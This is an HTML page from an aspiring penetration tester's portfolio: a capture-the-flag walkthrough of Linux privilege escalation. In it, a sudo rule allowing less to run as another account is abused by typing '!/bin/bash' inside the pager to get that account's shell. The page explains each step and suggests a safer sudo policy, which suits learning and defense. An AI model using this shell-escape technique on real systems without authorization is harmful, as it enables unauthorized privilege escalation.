@@ -1,0 +1,242 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Sudoers / less CTF Walkthrough | Ahmed Vasil</title>
+  <meta name="description" content="Sudoers / less CTF deep walkthrough — a sudo rule lets less run as another account, and less can open a shell.">
+  <link rel="canonical" href="https://vasilahmed744.github.io/Ahmed-Vasil-Portfolio/walkthrough-sudoers-less.html">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&amp;family=IBM+Plex+Serif:ital,wght@0,500;0,600;0,700;1,500&amp;display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="brand" href="index.html"><span class="brand-mark">AV</span><span><span class="brand-name">Ahmed Vasil</span><br><span class="brand-role">Aspiring Penetration Tester</span></span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="index.html">Home</a>
+      <a href="about.html">About</a>
+      <a href="projects.html">Projects</a>
+      <a href="skills.html">Skills</a>
+      <a href="journey.html">Journey</a>
+      <a href="walkthroughs.html" class="active">Walkthroughs</a>
+      <a href="contact.html" class="nav-cta">Contact</a>
+    </nav>
+  </div>
+</header>
+<main>
+  <div class="wrap">
+    <div class="page-head anim d1">
+      <span class="eyebrow"><span class="section-no">06</span>Walkthroughs · Privilege Escalation</span>
+      <div class="gold-rule"></div>
+      <h1>Sudoers / less CTF — Deep Walkthrough</h1>
+      <p class="lede">Linux escalation — sudoers (Medium). A sudo rule lets less run as another account, and less can open a shell.</p>
+    </div>
+    <section class="block wt-content">
+      <table class="info-table anim d2">
+        <tr><th>Challenge</th><td>Linux Escalation — sudoers (Medium)</td></tr>
+        <tr><th>Initial account</th><td>user</td></tr>
+        <tr><th>Privilege target</th><td>ctf</td></tr>
+      </table>
+      <div class="note anim d2"><strong>Scope.</strong> This document covers only the first authorized CTF discussed in the session. It explains the observed SSH access and the sudo/less privilege transition. The session did not capture the later ctf-to-root step, so this walkthrough does not invent one.</div>
+
+      <h2 class="anim d2">1. Understanding the provided challenge files</h2>
+      <p>The challenge package contained two important files: username.txt and id_ecdsa. The username file contained <code class="inline">user</code>, while id_ecdsa was an ECDSA SSH private key.</p>
+      <p>An SSH private key is authentication material. Instead of entering an account password, the SSH client can prove possession of the private key corresponding to a public key authorized on the server.</p>
+
+      <h2>2. Why the initial netcat attempt failed</h2>
+      <p>The first connection attempt used netcat:</p>
+      <pre class="code"><code>nc 172.31.45.248 31711</code></pre>
+      <p>The server replied:</p>
+      <pre class="code"><code>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1</code></pre>
+      <p>After typing <code class="inline">ls</code>, the response was:</p>
+      <pre class="code"><code>Invalid SSH identification string.</code></pre>
+      <p>This happened because TCP port 31711 was not a raw command shell. It was an SSH service. Netcat established a TCP connection and exposed the SSH banner, but it did not perform the SSH protocol handshake. Sending <code class="inline">ls</code> therefore looked like invalid SSH protocol data to the server.</p>
+      <p>The important lesson is: a reachable TCP port is not automatically an interactive shell. First identify the protocol running on it, then use the correct client.</p>
+
+      <h2>3. Preparing the SSH private key</h2>
+      <p>OpenSSH expects private key files to have restrictive local permissions. The key was protected with:</p>
+      <pre class="code"><code>chmod 600 id_ecdsa</code></pre>
+      <p>Mode 600 means:</p>
+      <pre class="code"><code>6 = read + write for the owner
+0 = no permissions for the group
+0 = no permissions for others
+
+Result: rw-------</code></pre>
+      <p>This protects the private key from other local users and prevents the SSH client from rejecting it as overly accessible.</p>
+
+      <h2>4. Connecting correctly with SSH</h2>
+      <pre class="code"><code>ssh -i id_ecdsa -p 31711 user@172.31.45.248</code></pre>
+      <table class="wt-table">
+        <tr><th>Part</th><th>Meaning</th></tr>
+        <tr><td><code>ssh</code></td><td>Start the OpenSSH client.</td></tr>
+        <tr><td><code>-i id_ecdsa</code></td><td>Use id_ecdsa as the private identity key.</td></tr>
+        <tr><td><code>-p 31711</code></td><td>Connect to SSH on non-default TCP port 31711.</td></tr>
+        <tr><td><code>user@</code></td><td>Authenticate as the account named user.</td></tr>
+        <tr><td><code>172.31.45.248</code></td><td>Challenge target address.</td></tr>
+      </table>
+
+      <h2>5. Enumerating sudo permissions</h2>
+      <p>Once logged in, the key enumeration command was:</p>
+      <pre class="code"><code>sudo -l</code></pre>
+      <p><code class="inline">sudo -l</code> lists the commands that the current account is permitted to execute through sudo. In privilege-escalation labs this is important because a program that looks harmless may expose functionality capable of starting another process or shell.</p>
+      <p>The challenge returned:</p>
+      <pre class="code"><code>Matching Defaults entries for user:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+User user may run the following commands:
+    (ctf : ctf) NOPASSWD: /usr/bin/less</code></pre>
+
+      <h2>6. Deep meaning of the sudo rule</h2>
+      <p>The critical line was:</p>
+      <pre class="code"><code>(ctf : ctf) NOPASSWD: /usr/bin/less</code></pre>
+      <p>It does not say that user can run less as root. The first ctf is the permitted run-as user, and the second ctf is the permitted run-as group. NOPASSWD means sudo will not request a password for this allowed command. /usr/bin/less is the exact permitted executable.</p>
+      <pre class="code"><code>Current identity: user
+       |
+       | sudo rule permits /usr/bin/less
+       v
+Run-as identity: ctf:ctf</code></pre>
+      <p>This is why blindly using <code class="inline">sudo less ...</code> is less clear than explicitly specifying <code class="inline">-u ctf</code>: the objective is to exercise the permission exactly as the sudo rule describes.</p>
+
+      <h2>7. What /etc/hosts is and why it was used</h2>
+      <p>/etc/hosts is a normal Linux text configuration file used for local hostname-to-IP mappings. A simple example could contain:</p>
+      <pre class="code"><code>127.0.0.1   localhost
+192.168.1.50 server1</code></pre>
+      <p>In this CTF, /etc/hosts was not the vulnerability. It was simply a convenient readable text file to give to less. The command needs a file to display so that the interactive less interface opens.</p>
+      <p>The path can be read as:</p>
+      <pre class="code"><code>/etc/hosts
+ |    |
+ |    +-- file named hosts
+ +------- /etc, the system configuration directory</code></pre>
+
+      <h2>8. Running less as the ctf account</h2>
+      <pre class="code"><code>sudo -u ctf /usr/bin/less /etc/hosts</code></pre>
+      <table class="wt-table">
+        <tr><th>Part</th><th>Meaning</th></tr>
+        <tr><td><code>sudo</code></td><td>Execute an allowed command through sudo</td></tr>
+        <tr><td><code>-u ctf</code></td><td>Request ctf as the run-as user</td></tr>
+        <tr><td><code>/usr/bin/less</code></td><td>The exact program allowed by sudoers</td></tr>
+        <tr><td><code>/etc/hosts</code></td><td>Readable text file opened by less</td></tr>
+      </table>
+      <p>At this point the important security context is that the less process itself is running with ctf's identity.</p>
+
+      <h2>9. Why less can become a privilege-escalation primitive</h2>
+      <p>less is an interactive pager, not merely a passive file reader. Its interactive command interface supports invoking an external shell command using <code class="inline">!</code>. If a privileged sudo configuration allows less without preventing that functionality, a command launched from inside less can inherit the identity of the privileged less process.</p>
+      <p>Inside the running less interface, the challenge used:</p>
+      <pre class="code"><code>!/bin/bash</code></pre>
+      <p>Conceptually:</p>
+      <pre class="code"><code>user
+ |
+ | sudo -u ctf /usr/bin/less /etc/hosts
+ v
+less process running as ctf
+ |
+ | !/bin/bash
+ v
+bash process inherits ctf identity
+ |
+ v
+ctf shell</code></pre>
+      <p>The security mistake is therefore not that /etc/hosts can be read. The problem is granting a more privileged identity permission to run an interactive program capable of spawning external commands.</p>
+
+      <h2>10. Verifying the new identity</h2>
+      <p>After the shell opened, the identity should be verified rather than assumed:</p>
+      <pre class="code"><code>whoami
+id</code></pre>
+      <p><code class="inline">whoami</code> prints the effective username. <code class="inline">id</code> gives more detail, including UID, primary GID, and supplementary groups. A successful first transition should show the ctf identity.</p>
+
+      <h2>11. Enumerating the next privilege boundary</h2>
+      <p>After becoming ctf, the next correct step is to enumerate sudo permissions again:</p>
+      <pre class="code"><code>sudo -l</code></pre>
+      <p>Why repeat it? Sudo policy is evaluated for the current account. The permissions available to ctf may be completely different from those available to user. Therefore each privilege transition creates a new enumeration point.</p>
+      <div class="note"><strong>Where the verified walkthrough stops.</strong> The conversation ended before the output of this second <code class="inline">sudo -l</code> was captured. For accuracy, this walkthrough stops the verified path here instead of fabricating the ctf-to-root method.</div>
+
+      <h2>12. Verified attack path</h2>
+      <pre class="code"><code>Challenge files
+ |
+ +-- username.txt -&gt; user
+ +-- id_ecdsa     -&gt; SSH private key
+ |
+ v
+SSH service on TCP/31711
+ |
+ v
+ssh -i id_ecdsa -p 31711 user@172.31.45.248
+ |
+ v
+user shell
+ |
+ v
+sudo -l
+ |
+ v
+(ctf : ctf) NOPASSWD: /usr/bin/less
+ |
+ v
+sudo -u ctf /usr/bin/less /etc/hosts
+ |
+ v
+Inside less: !/bin/bash
+ |
+ v
+ctf shell
+ |
+ v
+whoami / id / sudo -l
+ |
+ v
+Next stage must be determined from ctf's actual permissions</code></pre>
+
+      <h2>13. Root cause</h2>
+      <p>The verified sudoers weakness is an unsafe delegation of an interactive executable. The low-privileged account was intentionally allowed to execute less as another account, but less includes functionality that can launch external commands. Consequently, the permission effectively delegated more capability than simply viewing a file.</p>
+      <p>A safer sudo policy should grant the narrowest possible non-interactive operation, avoid shell-capable programs where unnecessary, and use application-specific restrictions or dedicated helpers when privileged file viewing is required.</p>
+
+      <h2>14. Commands used in the verified first CTF</h2>
+      <pre class="code"><code># Initial test that revealed SSH was running on the port
+nc 172.31.45.248 31711
+
+# Protect the provided private key
+chmod 600 id_ecdsa
+
+# Correct SSH login
+ssh -i id_ecdsa -p 31711 user@172.31.45.248
+
+# Enumerate current sudo permissions
+sudo -l
+
+# Run the allowed pager as ctf
+sudo -u ctf /usr/bin/less /etc/hosts
+
+# Type this INSIDE less, not at the normal shell prompt
+!/bin/bash
+
+# Verify the resulting identity
+whoami
+id
+
+# Enumerate the new account's sudo permissions
+sudo -l</code></pre>
+
+      <h2>15. Main learning points</h2>
+      <p>First, identify the service protocol before interacting with a port. Second, treat <code class="inline">sudo -l</code> as a privilege-boundary map rather than assuming sudo always means root. Third, read the run-as user and group carefully. Fourth, recognize that interactive tools such as pagers, editors, interpreters, and similar programs may expose command-execution features. Finally, after every successful identity transition, verify the identity and enumerate again.</p>
+      <div class="wt-nav">
+        <a href="walkthrough-nfs.html">← NFS CTF</a>
+        <a href="walkthrough-suid-sgid.html">Next: SUID / SGID →</a>
+      </div>
+    </section>
+  </div>
+</main>
+<footer>
+  <div class="wrap footer-cta"><a href="contact.html">Work with me →</a></div>
+  <div class="wrap footer-inner">
+    <span class="f-name">Ahmed Vasil</span>
+    <span class="f-role">Aspiring Penetration Tester</span>
+    <span class="footer-links"><a href="https://github.com/vasilahmed744">GitHub</a><a href="https://www.linkedin.com/in/ahamad-vasil-205590386">LinkedIn</a></span>
+  </div>
+  <div class="wrap footer-base"><span>© Ahmed Vasil</span><span>Narasimharajapura, Karnataka, India</span></div>
+</footer>
+</body>
+</html>
